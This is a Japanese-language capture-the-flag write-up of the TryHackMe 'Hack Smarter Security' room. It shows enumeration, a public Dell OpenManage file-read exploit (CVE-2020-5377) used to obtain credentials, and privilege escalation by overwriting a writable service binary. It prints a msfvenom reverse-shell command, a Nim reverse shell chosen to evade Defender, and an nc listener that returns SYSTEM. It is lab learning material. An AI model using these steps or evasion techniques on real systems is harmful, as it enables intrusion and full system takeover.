# Hack Smarter Security CTF

https://tryhackme.com/room/hacksmartersecurity

## Enumeration

```shell
TARGET=10.201.97.51
sudo bash -c "echo $TARGET   hacksmartersec.thm >> /etc/hosts"
```

### ポートスキャン

```sh
# windows
sudo nmap -vv -Pn -p- $TARGET
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack ttl 128
22/tcp   open  ssh           syn-ack ttl 128
80/tcp   open  http          syn-ack ttl 128
1311/tcp open  rxmon         syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
5985/tcp open  wsman         syn-ack ttl 128
7680/tcp open  pando-pub     syn-ack ttl 128
```

```sh
sudo nmap -sT -sC -p21,22,80,1311,3389,5985,7680 $TARGET

PORT     STATE    SERVICE
21/tcp   open     ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open     ssh
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open     http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HackSmarterSec
1311/tcp open     rxmon
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
3389/tcp open     ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-05T04:35:47+00:00
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2025-11-04T04:27:11
|_Not valid after:  2026-05-06T04:27:11
|_ssl-date: 2025-11-05T04:35:47+00:00; 0s from scanner time.
5985/tcp open     wsman
7680/tcp filtered pando-pub
```

FTP, SSH  
80ポートはHTTP、1311ポートはHTTPS。

FTP anonymous で2ファイル発見したが、使える情報は無い。

```sh
$ ls -al
total 1016
drwxrwxr-x 3 kali kali    4096 Nov  5 13:34 .
drwxrwxr-x 6 kali kali    4096 Nov  5 13:30 ..
-rw-rw-r-- 1 kali kali    3622 Jun 28  2023 Credit-Cards-We-Pwned.txt
-rw-rw-r-- 1 kali kali 1022126 Jun 29  2023 stolen-passport.png
```

### 80

ディレクトリ列挙では役立つものは見つからなかった。

### 1311

`DELL EMC OPENMANAGE` の認証画面が表示される。

いくつか脆弱性が出てくるが、バージョンは不明。

```sh
$ searchsploit openmanage                                       
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Dell OpenManage Network Manager 6.2.0.51 SP3 - Multiple Vulnerabilities                                                                                                                                  | linux/webapps/45852.py
Dell OpenManage Server Administrator - Cross-Site Scripting                                                                                                                                              | multiple/remote/38179.txt
Dell OpenManage Server Administrator 8.2 - (Authenticated) Directory Traversal                                                                                                                           | windows/webapps/39486.txt
Dell OpenManage Server Administrator 8.3 - XML External Entity                                                                                                                                           | xml/webapps/39909.rb
Dell OpenManage Server Administrator 9.4.0.0 - Arbitrary File Read                                                                                                                                       | windows/webapps/49750.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## CVE-2020-5377

9.4.0.0 の脆弱性について、SessionIDを取れているので全くダメというわけではなさそうだが、ファイルコンテンツが表示されてほしいところでHTMLが表示されて機能しなかった。

```sh
$ python2 ./49750.py 10.11.146.32 $TARGET:1311
Session: F1FDA3C320304B762A3847E795CB3012
VID: 73200451FF078E3A
file > /Windows/system.ini
Reading contents of /Windows/system.ini:
<HTML>
<head>
    <script language="javascript">
    if (window != top) {
        // Load page in the top frame.
        top.location.href = window.location.href
```

python3 で実装された下記エクスプロイトを使うと取得できた。

https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514

```sh
$ python ./CVE-2020-5377.py 10.11.146.32 $TARGET:1311 
Session: CC0D9BAD746FC8E3A18DDBE46243C7EB
VID: 76A632E367C082D2
file > /Windows/WindowsUpdate.log
Reading contents of /Windows/WindowsUpdate.log:
Windows Update logs are now generated using ETW (Event Tracing for Windows).
Please run the Get-WindowsUpdateLog PowerShell command to convert ETW traces into a readable WindowsUpdate.log.


For more information, please visit https://go.microsoft.com/fwlink/?LinkId=518345
```

IISの設定ファイル。tylerのパスワードを入手。SSHで接続できた。

```xml
file > /inetpub/wwwroot/hacksmartersec/web.config
Reading contents of /inetpub/wwwroot/hacksmartersec/web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="[REDACTED]" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>
```

## 権限昇格

ポートの検査

```sh
tyler@HACKSMARTERSEC C:\Users>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1924
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2076
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1311           0.0.0.0:0              LISTENING       1264
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       468
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1048
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       944
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1812
  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       612
  TCP    10.201.97.51:22        10.11.146.32:38434     ESTABLISHED     2076
  TCP    10.201.97.51:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:49686        127.0.0.1:49687        ESTABLISHED     1264
  TCP    127.0.0.1:49687        127.0.0.1:49686        ESTABLISHED     1264
  TCP    127.0.0.1:49689        127.0.0.1:49690        ESTABLISHED     1264
  TCP    127.0.0.1:49690        127.0.0.1:49689        ESTABLISHED     1264
  TCP    [::]:21                [::]:0                 LISTENING       1924
  TCP    [::]:22                [::]:0                 LISTENING       2076
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       864
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:1311              [::]:0                 LISTENING       1264
  TCP    [::]:3389              [::]:0                 LISTENING       952
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       468
  TCP    [::]:49665             [::]:0                 LISTENING       1048
  TCP    [::]:49666             [::]:0                 LISTENING       944
  TCP    [::]:49667             [::]:0                 LISTENING       636
  TCP    [::]:49668             [::]:0                 LISTENING       1812
  TCP    [::]:49672             [::]:0                 LISTENING       612
  UDP    0.0.0.0:123            *:*                                    2028
  UDP    0.0.0.0:3389           *:*                                    952
  UDP    0.0.0.0:5353           *:*                                    1168
  UDP    0.0.0.0:5355           *:*                                    1168
  UDP    10.201.97.51:137       *:*                                    4
  UDP    10.201.97.51:138       *:*                                    4
  UDP    127.0.0.1:62019        *:*                                    944
  UDP    [::]:123               *:*                                    2028
  UDP    [::]:3389              *:*                                    952
  UDP    [::]:5353              *:*                                    1168
  UDP    [::]:5355              *:*                                    1168
```

5985,49001はHTTPサービスだが、dirsearch で何も出なかった。

winPEAS はウイルス検出されて失敗した。
```ps
PS C:\Users\tyler\Desktop> .\peas.ps1
At C:\Users\tyler\Desktop\peas.ps1:1 char:1 
+ <#
+ ~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

https://github.com/itm4n/PrivescCheck はウイルス検出されなかった。1件、権限昇格のリスクを検出。

```sh
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
┃                 ~~~ PrivescCheck Summary ~~~                 ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 TA0004 - Privilege Escalation 
 - Services - Image File Permissions → High 
 TA0006 - Credential Access
 - Hardening - Credential Guard → Low
 - Hardening - LSA Protection → Low

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Services - Image File Permissions                 ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service's binary or its folder.                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Name              : spoofer-scheduler
DisplayName       : Spoofer Scheduler
User              : LocalSystem
ImagePath         : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
StartMode         : Automatic
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\spoofer-scheduler
Status            : Running
UserCanStart      : True
UserCanStop       : True
ModifiablePath    : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
IdentityReference : BUILTIN\Users (S-1-5-32-545)
Permissions       : AllAccess
```

exe にフルアクセスが付いているので上書きができる。

```sh
PS C:\Users\tyler\Desktop> icacls "C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe"
C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe BUILTIN\Users:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKA
GES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

サービスexe用のペイロードを作成

```sh
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.146.32 LPORT=1337 -f exe-service -o spoofer-scheduler.exe.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: spoofer-scheduler.exe.exe
```

実行中なので上書きできない。

```sh
$ scp ./spoofer-scheduler.exe.exe tyler@10.201.97.51:"C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe"
tyler@10.201.97.51's password: 
scp: dest open "C:\\Program Files (x86)\\Spoofer\\spoofer-scheduler.exe": Failure
scp: failed to upload file ./spoofer-scheduler.exe.exe to C:\\Program Files (x86)\\Spoofer\\spoofer-scheduler.exe
```

サービス自体を止める権限は無い。どうする？

```ps
PS C:\Users\tyler\Desktop> net stop spoofer-scheduler
System error 5 has occurred.

Access is denied.
```

また、もう一つ大きな問題があり、msfvenomで作成したリバースシェルはウイルス検出されて実行できなかった。

```ps
PS C:\Users\tyler\Desktop> .\spoofer-scheduler.exe
Program 'spoofer-scheduler.exe' failed to run: Operation did not complete successfully because the file contains   
a virus or potentially unwanted softwareAt line:1 char:1
+ .\spoofer-scheduler.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\spoofer-scheduler.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

この二点の問題で詰まり、お手上げ。  
知らないとどうしようもないタイプの問題だと思うので、ウォークスルーを見た。

一点目。net stop ではなく、sc stop ならアクセス拒否されなかった。

```sh
sc stop spoofer-scheduler
```

二点目。[Nim Reverse Shell](https://github.com/Sn1r/Nim-Reverse-Shell) を使う。  
ちなみに、チャレンジ時点（2025年）のDefender定義ではバッチリ、ウイルスとして検出されたので過信は禁物。

ポートとIPを編集してビルド。ポートは80にする。

```sh
$ nim c -d:mingw --app:gui -o:spoofer-scheduler.exe rev_shell.nim
```

サービスストップ後、scpで上書き、サービス開始するとリバースシェルを取れた。  
ただし、サービス用のexeではないため、数十秒程度でエラー終了してしまうので忙しい。

```sh
$ nc -lnvp 80                                                    
listening on [any] 80 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.88.218] 49951
C:\Windows\system32> whoami
nt authority\system
```

## 振り返り

- Windows のサービスは権限が複雑で難しい。net stop はアクセス拒否されるが、sc stop は成功する場合があると初めて知った。
- サービスexeの置き換えで、通常のexeでも（短時間で切れるとは言え）リバースシェルが成立することを初めて知った。
- こういう場合に使える、Defenderに検出されない自作のリバースシェルが欲しい。
